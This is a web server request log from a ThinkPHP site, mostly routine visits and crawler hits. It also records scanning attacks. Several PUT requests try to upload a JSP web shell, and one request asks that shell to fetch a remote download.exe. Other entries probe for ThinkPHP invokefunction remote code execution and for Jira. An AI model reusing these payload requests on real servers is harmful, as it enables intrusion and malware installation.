---------------------------------------------------------------
[2019-10-01T01:28:27+08:00] 123.57.150.3 PUT 123.57.56.8/FxCodeShell.jsp%20
[运行时间：0.094283s] [吞吐率：10.61req/s] [内存消耗：1,983.10kb] [文件加载：125]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-10-01T01:28:27+08:00] 123.57.150.3 PUT 123.57.56.8/FxCodeShell.jsp/
[运行时间：0.027644s] [吞吐率：36.17req/s] [内存消耗：1,983.08kb] [文件加载：125]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-10-01T01:28:27+08:00] 123.57.150.3 GET 123.57.56.8/FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fky.dfg45dfg45.best/download.exe
[运行时间：0.027510s] [吞吐率：36.35req/s] [内存消耗：1,972.06kb] [文件加载：125]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-10-01T02:05:50+08:00] 58.249.97.42 GET www.maxthink.cn/
[运行时间：0.075187s] [吞吐率：13.30req/s] [内存消耗：2,210.74kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'deflate, gzip',
  'accept' => '*/*',
  'host' => 'www.maxthink.cn',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T02:19:10+08:00] 183.25.123.217 POST 123.57.56.8/app/api.php
[运行时间：0.031638s] [吞吐率：31.61req/s] [内存消耗：1,970.93kb] [文件加载：125]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-10-01T02:20:02+08:00] 183.25.123.217 POST 123.57.56.8/app/api.php
[运行时间：0.041109s] [吞吐率：24.33req/s] [内存消耗：1,970.93kb] [文件加载：125]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-10-01T02:20:11+08:00] 183.25.123.217 POST 123.57.56.8/app/api.php
[运行时间：0.032723s] [吞吐率：30.56req/s] [内存消耗：1,970.93kb] [文件加载：125]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-10-01T02:22:02+08:00] 183.25.123.217 POST 123.57.56.8/app/api.php
[运行时间：0.039621s] [吞吐率：25.24req/s] [内存消耗：1,970.93kb] [文件加载：125]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-10-01T02:26:39+08:00] 101.251.242.238 GET 123.57.56.8:80/
[运行时间：0.034661s] [吞吐率：28.85req/s] [内存消耗：2,198.59kb] [文件加载：130]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept' => 'application/json, text/plain, */*',
  'accept-charset' => 'GBK,utf-8;q=0.7,*;q=0.3',
  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
  'accept-encoding' => 'gzip, deflate, br',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
  'host' => '123.57.56.8:80',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T03:02:28+08:00] 39.106.78.1 GET 123.57.56.8/TP/public/index.php
[运行时间：0.028458s] [吞吐率：35.14req/s] [内存消耗：1,971.53kb] [文件加载：125]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-10-01T03:02:28+08:00] 39.106.78.1 GET 123.57.56.8/TP/index.php
[运行时间：0.027463s] [吞吐率：36.41req/s] [内存消耗：1,971.52kb] [文件加载：125]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-10-01T03:02:28+08:00] 39.106.78.1 GET 123.57.56.8/thinkphp/html/public/index.php
[运行时间：0.027349s] [吞吐率：36.56req/s] [内存消耗：1,971.54kb] [文件加载：125]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-10-01T03:02:28+08:00] 39.106.78.1 GET 123.57.56.8/html/public/index.php
[运行时间：0.027644s] [吞吐率：36.17req/s] [内存消耗：1,971.53kb] [文件加载：125]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-10-01T03:02:28+08:00] 39.106.78.1 GET 123.57.56.8/public/index.php
[运行时间：0.027217s] [吞吐率：36.74req/s] [内存消耗：1,971.53kb] [文件加载：125]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-10-01T03:02:28+08:00] 39.106.78.1 GET 123.57.56.8/TP/html/public/index.php
[运行时间：0.026530s] [吞吐率：37.69req/s] [内存消耗：1,971.54kb] [文件加载：125]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-10-01T03:02:28+08:00] 39.106.78.1 GET 123.57.56.8/elrekt.php
[运行时间：0.026671s] [吞吐率：37.49req/s] [内存消耗：1,971.52kb] [文件加载：125]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-10-01T03:02:28+08:00] 39.106.78.1 GET 123.57.56.8/index.php
[运行时间：0.029442s] [吞吐率：33.97req/s] [内存消耗：2,210.75kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'connection' => 'close',
  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
  'host' => '123.57.56.8',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T03:02:28+08:00] 39.106.78.1 GET 123.57.56.8/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
[运行时间：0.041327s] [吞吐率：24.20req/s] [内存消耗：1,949.71kb] [文件加载：124]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-10-01T03:02:28+08:00] 39.106.78.1 POST 123.57.56.8/index.php?s=captcha
[运行时间：0.028182s] [吞吐率：35.48req/s] [内存消耗：1,971.30kb] [文件加载：125]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-10-01T03:02:28+08:00] 39.106.78.1 GET 123.57.56.8:80/
[运行时间：0.032236s] [吞吐率：31.02req/s] [内存消耗：2,210.79kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'connection' => 'close',
  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
  'host' => '123.57.56.8:80',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T03:22:17+08:00] 123.126.113.179 GET aizhuanbao.cn/
[运行时间：0.032029s] [吞吐率：31.22req/s] [内存消耗：2,211.63kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'if-modified-since' => 'Wed, 18 Sep 2019 18:53:50 GMT',
  'connection' => 'close',
  'user-agent' => 'Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)',
  'accept-encoding' => 'gzip,deflate',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'host' => 'aizhuanbao.cn',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T03:39:23+08:00] 47.101.162.42 GET www.maxthink.cn/
[运行时间：0.033405s] [吞吐率：29.94req/s] [内存消耗：2,210.75kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'connection' => 'Keep-Alive',
  'host' => 'www.maxthink.cn',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T03:44:22+08:00] 47.97.120.5 GET www.maxthink.cn/
[运行时间：0.149831s] [吞吐率：6.67req/s] [内存消耗：2,210.73kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'connection' => 'Keep-Alive',
  'host' => 'www.maxthink.cn',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D)',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T03:45:12+08:00] 101.132.106.40 GET www.aizhuanbao.cn/
[运行时间：0.032371s] [吞吐率：30.89req/s] [内存消耗：2,210.74kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'connection' => 'Keep-Alive',
  'host' => 'www.aizhuanbao.cn',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D)',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T03:47:03+08:00] 47.100.38.9 GET aizhuanbao.cn/
[运行时间：0.033283s] [吞吐率：30.05req/s] [内存消耗：2,210.70kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'connection' => 'Keep-Alive',
  'host' => 'aizhuanbao.cn',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D)',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T03:49:22+08:00] 80.82.70.187 GET www.baidu.com/cache/global/img/gs.gif
[运行时间：0.169688s] [吞吐率：5.89req/s] [内存消耗：1,971.41kb] [文件加载：125]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-10-01T03:50:06+08:00] 47.100.57.133 GET maxthink.cn/
[运行时间：0.032681s] [吞吐率：30.60req/s] [内存消耗：2,210.70kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'connection' => 'Keep-Alive',
  'host' => 'maxthink.cn',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D)',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T04:07:42+08:00] 47.101.191.231 GET www.maxthink.cn/
[运行时间：0.081799s] [吞吐率：12.23req/s] [内存消耗：2,210.75kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'connection' => 'Keep-Alive',
  'host' => 'www.maxthink.cn',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T04:10:09+08:00] 54.36.150.13 GET www.aizhuanbao.cn/
[运行时间：0.033496s] [吞吐率：29.85req/s] [内存消耗：2,210.73kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'deflate, gzip',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)',
  'host' => 'www.aizhuanbao.cn',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T04:16:01+08:00] 37.204.188.209 GET www.aizhuanbao.cn/
[运行时间：0.034062s] [吞吐率：29.36req/s] [内存消耗：2,215.07kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'cache-control' => 'no-cache',
  'connection' => 'Keep-Alive',
  'host' => 'www.aizhuanbao.cn',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; MASBJS)',
  'referer' => 'https://yandex.ru/clck/jsredir?from=yandex.ru%3Bsearch%3Bweb%3B%3B&text=&etext=6359.djQ19C-xo64Vx5DQrfaNoWiiS5ObzfDXk0-QdczkdaCrL1m9B4B8_SBrr7MZUlA8.bccaad6fbb029c3788c53d1c22c056e9cbd49cc7&uuid=&state=_BLhILn4SxNIvvL0W45KSic66uCIg23qh8iRG98qeIXmeppkgUc0YKCJkrjchpDstTwxTkjwGrA&data=UlNrNmk5WktYejR0eWJFYk1LdmtxbzZMZFBIbWhsSl9lWFpQaDZqajZVMS00UFp2cG9WRV9wbTdUTV85LXMwelJGMHhHR0xyR3FJUlExRWFscWlPSi1Tcmk2RzlhcS1aVk5jUTBGOWVHNHM&b64e=2&sign=9cc6babd42ab8859f0c2486dab54a313&keyno=0&cst=AiuY0DBWFJ7IXge4WdYJQYP93XfrtkbaUs13sIVFvqqEFDzRZVtQLQDweRvQhQqdrPayIcnFklcrK7YC1cIA2e20jli6woj6DcrOJ06ElrDY2JnbFyyJb3mfY1PkAR6cOgJ2budPqDR82ZuqlmGTxg&ref=orjY4mGPRjk5boDnW0uvlrrd71vZw9kp5uQozpMtKCWuAUzT58TqAQb2yfDz6JUy96MmwZ_ICPAzOZOpcpQc_On1LQjNkIJ8CnicbpdlpYTaT1e9WsvyNcm4s95uKGpT&l10n=ru&cts=1569870735171&mc=5.93088450766',
  'accept-language' => 'ru-RU',
  'accept' => '*/*',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T04:25:35+08:00] 183.136.190.62 GET www.maxthink.cn/
[运行时间：0.031853s] [吞吐率：31.39req/s] [内存消耗：2,211.99kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'cache-control' => 'max-age=0',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'accept-encoding' => '',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
  'host' => 'www.maxthink.cn',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T04:28:43+08:00] 183.136.190.62 GET aizhuanbao.cn/
[运行时间：0.088623s] [吞吐率：11.28req/s] [内存消耗：2,211.96kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'cache-control' => 'max-age=0',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'accept-encoding' => '',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
  'host' => 'aizhuanbao.cn',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T04:30:11+08:00] 183.136.190.62 GET maxthink.cn/
[运行时间：0.029718s] [吞吐率：33.65req/s] [内存消耗：2,211.96kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'cache-control' => 'max-age=0',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'accept-encoding' => '',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
  'host' => 'maxthink.cn',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T04:47:35+08:00] 2.187.77.222 GET 123.57.56.8:80/
[运行时间：0.032169s] [吞吐率：31.09req/s] [内存消耗：2,210.70kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'host' => '123.57.56.8:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T04:57:46+08:00] 183.129.160.229 GET 123.57.56.8:80/
[运行时间：0.029424s] [吞吐率：33.99req/s] [内存消耗：2,210.79kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0',
  'host' => '123.57.56.8:80',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T05:01:11+08:00] 183.136.190.62 GET www.aizhuanbao.cn/
[运行时间：0.031255s] [吞吐率：31.99req/s] [内存消耗：2,212.00kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'cache-control' => 'max-age=0',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'accept-encoding' => '',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
  'host' => 'www.aizhuanbao.cn',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T05:31:19+08:00] 183.136.190.62 GET joke.aizhuanbao.cn/
[运行时间：0.032167s] [吞吐率：31.09req/s] [内存消耗：2,212.00kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'cache-control' => 'max-age=0',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'accept-encoding' => '',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
  'host' => 'joke.aizhuanbao.cn',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T06:00:04+08:00] 116.212.148.198 GET 123.57.56.8:80/
[运行时间：0.031791s] [吞吐率：31.46req/s] [内存消耗：2,210.70kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '123.57.56.8:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T06:34:49+08:00] 47.101.187.80 GET www.aizhuanbao.cn/
[运行时间：0.029999s] [吞吐率：33.33req/s] [内存消耗：2,210.76kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'connection' => 'Keep-Alive',
  'host' => 'www.aizhuanbao.cn',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T07:08:56+08:00] 201.92.41.226 GET 123.57.56.8:80/
[运行时间：0.061293s] [吞吐率：16.32req/s] [内存消耗：2,210.70kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
  'host' => '123.57.56.8:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T07:08:56+08:00] 201.92.41.226 GET 123.57.56.8:80/
[运行时间：0.036257s] [吞吐率：27.58req/s] [内存消耗：2,210.70kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
  'host' => '123.57.56.8:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T07:10:34+08:00] 47.101.203.216 GET 123.57.56.8/
[运行时间：0.031502s] [吞吐率：31.74req/s] [内存消耗：2,210.76kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'connection' => 'Keep-Alive',
  'host' => '123.57.56.8',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T08:03:34+08:00] 47.101.190.59 GET joke.aizhuanbao.cn/
[运行时间：0.032801s] [吞吐率：30.49req/s] [内存消耗：2,210.76kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'connection' => 'Keep-Alive',
  'host' => 'joke.aizhuanbao.cn',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T08:18:18+08:00] 42.236.10.120 GET www.aizhuanbao.cn/
[运行时间：0.032002s] [吞吐率：31.25req/s] [内存消耗：2,212.03kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider',
  'connection' => 'Keep-Alive',
  'accept-language' => 'zh-CN',
  'accept' => '*/*',
  'cookie' => '',
  'referer' => 'http://www.aizhuanbao.cn/',
  'accept-encoding' => 'deflate, gzip',
  'host' => 'www.aizhuanbao.cn',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T08:18:32+08:00] 42.236.102.3 GET aizhuanbao.cn/
[运行时间：0.043854s] [吞吐率：22.80req/s] [内存消耗：2,211.98kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider',
  'connection' => 'Keep-Alive',
  'accept-language' => 'zh-CN',
  'accept' => '*/*',
  'cookie' => '',
  'referer' => 'http://aizhuanbao.cn/',
  'accept-encoding' => 'deflate, gzip',
  'host' => 'aizhuanbao.cn',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T08:56:52+08:00] 47.100.238.73 GET maxthink.cn/
[运行时间：0.031038s] [吞吐率：32.22req/s] [内存消耗：2,210.72kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'connection' => 'Keep-Alive',
  'host' => 'maxthink.cn',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T09:09:32+08:00] 169.197.108.42 GET 123.57.56.8/secure/ContactAdministrators!default.jspa
[运行时间：0.074804s] [吞吐率：13.37req/s] [内存消耗：1,949.52kb] [文件加载：124]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
